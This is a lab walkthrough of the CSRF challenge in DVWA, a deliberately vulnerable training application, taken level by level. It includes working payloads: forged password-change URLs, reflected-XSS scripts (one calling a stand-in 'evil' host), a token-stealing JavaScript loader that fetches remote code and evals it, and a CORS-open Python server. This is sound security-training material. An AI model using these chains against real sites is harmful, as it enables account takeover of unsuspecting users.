---
description: http://localhost/DVWA/vulnerabilities/csrf/
---

# CSRF

<details>

<summary>What is a Cross-Site Request Forgery (CSRF)?</summary>

CSRF stands for Cross-Site Request Forgery. It is a type of security vulnerability that occurs when an attacker tricks a user's browser into making an unintended and potentially malicious request on a website where the user is authenticated. The attack takes advantage of the fact that many websites rely solely on the user's authentication credentials (such as cookies) to determine the legitimacy of a request.

Here's a basic scenario of how CSRF works:

1. The victim logs into a legitimate website and receives authentication credentials (e.g., a session cookie).
2. While the victim is still authenticated, the attacker lures the victim into clicking on a specially crafted link or visiting a malicious website.
3. The malicious website or link contains a request to perform an action on the targeted website, using the victim's authentication credentials stored in the browser.
4. The browser, trusting the authentication credentials, sends the request to the legitimate website on behalf of the authenticated user, unknowingly carrying out the attacker's instructions.
5. The targeted website, not recognizing the request as malicious, performs the action as if it were a legitimate request from the authenticated user.

CSRF attacks can result in various malicious actions, such as changing account settings, making financial transactions, or even performing actions with elevated privileges if the targeted user has administrative rights.

To prevent CSRF attacks, web developers often use techniques such as anti-CSRF tokens, which are unique tokens embedded in forms or requests to verify the legitimacy of the request. These tokens make it more challenging for attackers to forge requests because they would need to obtain the token, which is typically tied to the user's session.

</details>

{% hint style="info" %}
Using BurpSuite and the FoxyProxy extension is recommended.
{% endhint %}

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption><p><a href="https://portswigger.net/web-security/csrf">https://portswigger.net/web-security/csrf</a></p></figcaption></figure>

{% embed url="https://owasp.org/www-community/attacks/csrf" %}
[https://owasp.org/www-community/attacks/csrf](https://owasp.org/www-community/attacks/csrf)
{% endembed %}

{% embed url="https://portswigger.net/web-security/csrf" %}
[https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
{% endembed %}

## Low

We've a form with two input type text:

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

that ask us to change admin password entering new password and confirming it.

As always we can start to analyze source code:

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

* There'is a condition to check if input value has been inserted
* Check if the two passwords match
* If there're the same, change admin psw.

{% hint style="warning" %}
The input is not sanitized, so I can execute any (potentially malicious) command.
{% endhint %}

Considering that GET request to change psw is this

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

we can use and insert it in a URL to send at victim usually using social engineering techniques.

#### Payload

```bash
localhost/DVWA/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change#
```

using it, we can change password to a different password (password1) only opening payload URL via browser.

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

the same payload can be injected in a javascript code stored in another web page, but it can't work if the website used a **CORS** mechanism (Cross-origin resource sharing).

<details>

<summary>Cross-origin resource sharing (CORS)</summary>

Cross-origin resource sharing is an HTTP-header based mechanism that allows a server to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading resources. CORS also relies on a mechanism by which browsers make a "preflight" request to the server hosting the cross-origin resource, in order to check that the server will permit the actual request.

</details>

## Medium

<figure><img src="../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

* There's a classic control of input text submitted
* Check if the HTTP\_REFERER request has the same name and origin of name server (request isn't sent by an external source)
* Check the match between the new password and the confirmation password
* In the end, there's generate feedback for the end user.

<figure><img src="../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

If the HTTP\_REFERER is the same of the server name: csrf in our case, there're not problem;

while, using the same payload of level low (that has a different origin), HTTP\_REFERER link is not generated and we can't change password.

```url
localhost/DVWA/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change#
```

<figure><img src="../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

#### Payload

To exploit it, is necessary have an HTTP\_REFERER request with the same name server, then we can use XSS Reflected attack redirecting the attacker to the desired page, where it's run a malicious javascript code.

We can try to inject an example of javascript code such as:&#x20;

```html
<Script> alert("Hello World"); </Script>
```

into XSS Reflected section\


<figure><img src="../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

<div align="left">

<figure><img src="../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

</div>

Very well, using this XSS we can trigger the malicious password change request with the following XSS script:

```html
<Script> var xmlHttp = new XMLHttpRequest(); var url = "http://localhost/DVWA//vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change"; xmlHttp.open("GET", url, false); xmlHttp.send(null); </Script>
```

<figure><img src="../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

It usually need to convert URL-encode key characters and we can redirect user to localhost/DVWA page;

<figure><img src="../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

Upon obtaining the HTTP\_REFERER source (1st GET request), all javascript codes are accepted, then the password is changed (2st GET request).

{% hint style="warning" %}
Only checking if the HTTP\_REFERER request has the same name and origin of name server we can't be sure that request is valid, because can be redirect using XSS Reflected attack.
{% endhint %}

## High

<figure><img src="../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

* Generation and checking of Anti-CSRF token (in our case called user\_token), that will be regenerated for every request or page refresh

<div align="left">

<figure><img src="../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

</div>

* Check the match between the new password and the confirmation password
* Take a real escape string
* In the end, there's generate feedback for the end user.

To fix the first problem, we realize that for solving the high reflective XSS level we need the following payload

```html
<img src='#' onerror=alert(1) />
```

Even like this, if we just put the previous payload,

```php
<Script> var xmlHttp = new XMLHttpRequest(); var url = "http://evil/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change"; xmlHttp.open("GET", url, false); xmlHttp.send(null); </Script>
```

which has to be base64d and decoded with the `atob` function otherwise we get blocked, it won’t work because of the CSRF code.

```html
<img src='#' onerror="var xmlHttp = new XMLHttpRequest(); xmlHttp.open('GET', atob('aHR0cDovL2V2aWwvdnVsbmVyYWJpbGl0aWVzL2NzcmYvP3Bhc3N3b3JkX25ldz1uZXdwYXNzJnBhc3N3b3JkX2NvbmY9bmV3cGFzcyZDaGFuZ2U9Q2hhbmdl'), false); xmlHttp.send(null);" />
```

The idea then is to first do a GET request, extract the CSRF code, and then send it in the URL. In particular, we want to create the following URL

```php
GET /vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=6bed618fc0eaf44857bfa115c4c61a79
```

where `user_token` was obtained from a previous GET request to CSRF change password page. To create such URL we first experiment with JS code that is able to extract the `user_token` from the webpage in order to craft a valid GET request for changing the password of the user with a custom password. The following JS code does the job.

#### Payload

```javascript
var newpass = "test"
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://localhost/DVWA/vulnerabilities/csrf/', false);
xhr.onload = function() {
    var doc = new DOMParser().parseFromString(this.responseText, "text/xml");
    var csrf = doc.getElementsByName("user_token")[0].getAttribute("value");
    var xhr2 = new XMLHttpRequest();    
    xhr2.open('GET', `http://localhost/DVWA/vulnerabilities/csrf/?password_new=${newpass}&password_conf=${newpass}&Change=Change&user_token=${csrf}`, false);
    xhr2.send(null);
};
xhr.send(null);
```

We save this payload onto a file called `high.js`.

Now we need to find a way to execute this JS payload onto the victim browser. To avoid the block of the hard challenge of the reflected XSS, the idea is to write a small loader that loads a much bigger javascript file and executes it with eval. We can load this file by creating a malicious server which disables CORS checks. The code for such server is shown below

```python
#!/usr/bin/env python3

from http.server import HTTPServer, SimpleHTTPRequestHandler, test
import sys

class CORSRequestHandler (SimpleHTTPRequestHandler):
    def end_headers (self):
        self.send_header('Access-Control-Allow-Origin', '*')
        SimpleHTTPRequestHandler.end_headers(self)

if __name__ == '__main__':
    test(CORSRequestHandler, HTTPServer, port=int(sys.argv[1]) if len(sys.argv) > 1 else 8000)
```

We save that in `high-cors-server.py` and then execute it as follows

```bash
python3 high-cors-server.py
```

Once we have that running, we can use the following payload on the high reflected XSS challenge page of DVWA

```html
<img src='#' onerror="var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://localhost:8000/high.js', false); xhr.onload = function () {eval(this[atob('cmVzcG9uc2VUZXh0')])}; xhr.send(null); " />
```

This payload is encoded into the following GET request.

```url
http://localhost/DVWA/vulnerabilities/xss_r/?name=%3Cimg+src%3D%27%23%27+onerror%3D%22var+xhr+%3D+new+XMLHttpRequest%28%29%3B+xhr.open%28%27GET%27%2C+%27http%3A%2F%2Flocalhost%3A8000%2Fhigh.js%27%2C+false%29%3B+xhr.onload+%3D+function+%28%29+%7Beval%28this%5Batob%28%27cmVzcG9uc2VUZXh0%27%29%5D%29%7D%3B+xhr.send%28null%29%3B+%22+%2F%3E
```

by changing the `newpass` of the `high.js` script, we will control the password of the authenticated user who clicks on the previous link. In particular, when the user clicks on the link, the following things will happen:

* The reflective XSS on the DVWA page is triggered, executing the malicious js within the victim browser.
* The malicious js does a GET to the endpoint http://localhost:8000/high.js and performs an `eval` on the obtained text from the server.
* The javascript code loaded performs two GETs. One to obtian the CSRF code from the DVWA change password page, and the second to set a new password using the previous CSRF token.
* As soon as the second GET hits the server, the password of the user is changed by the server.

{% hint style="warning" %}
Using two XSS requests we can redirect user to the same origin of name server and we can't be sure that request is valid.
{% endhint %}

## Impossible

<figure><img src="../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

In this case there's a new input text: Current password, an info unknown by attacker that using others controls, prevents CSRF attack.

<figure><img src="../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Site isn't vulnerable to CSRF attack because the request includes info that the attacker cannot have access to.
{% endhint %}

## References

For the making of this solution the following resource were used:

* [https://stackoverflow.com/questions/21956683/enable-access-control-on-simple-http-server](https://stackoverflow.com/questions/21956683/enable-access-control-on-simple-http-server)
* [https://labs.withsecure.com/publications/getting-real-with-xss](https://labs.withsecure.com/publications/getting-real-with-xss)
* [https://github.com/LeonardoE95/DVWA/tree/main/src/client\_side\_request\_forgery](https://github.com/LeonardoE95/DVWA/tree/main/src/client\_side\_request\_forgery)
* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://owasp.org/www-community/attacks/csrf](https://owasp.org/www-community/attacks/csrf)
